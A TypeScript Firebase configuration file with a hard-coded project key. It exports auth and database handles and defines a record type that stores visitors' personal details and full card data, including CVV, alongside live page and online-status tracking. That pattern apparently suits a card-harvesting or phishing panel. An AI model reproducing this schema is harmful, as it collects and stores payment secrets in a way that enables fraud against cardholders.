import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyAiR3ek37ihgHwwWNUPGvk7GCElv57LKjw",
  authDomain: "swaidhah.firebaseapp.com",
  projectId: "swaidhah",
  storageBucket: "swaidhah.firebasestorage.app",
  messagingSenderId: "174987340513",
  appId: "1:174987340513:web:d5305013cddb399b4ae5a0",
  measurementId: "G-F95YHLR2MB"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);
export { app, auth, db,database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
  isOnline?: boolean
  lastSeen: string
}
